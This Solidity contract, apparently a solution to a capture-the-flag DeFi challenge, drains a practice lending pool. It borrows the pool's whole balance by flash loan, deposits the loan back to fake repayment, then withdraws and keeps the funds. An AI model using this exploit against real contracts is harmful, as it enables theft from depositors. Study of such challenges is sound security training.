// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/Address.sol';
import './SideEntranceLenderPool.sol';

/**
 * @title SideEntranceAttacker
 * @author jb
 */
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    using Address for address payable;

    address payable private _owner;
    SideEntranceLenderPool private _target;

    constructor() {
        _owner = payable(msg.sender);
    }

    function attack(SideEntranceLenderPool target) external {
        _target = target;
        _target.flashLoan(address(target).balance);
        _target.withdraw();
        _owner.sendValue(address(this).balance);
        _target = SideEntranceLenderPool(address(0));
    }

    // receive the flash loan and deposit the amount
    function execute() external payable override {
        _target.deposit{value: msg.value}();
    }

    receive() external payable {}
}
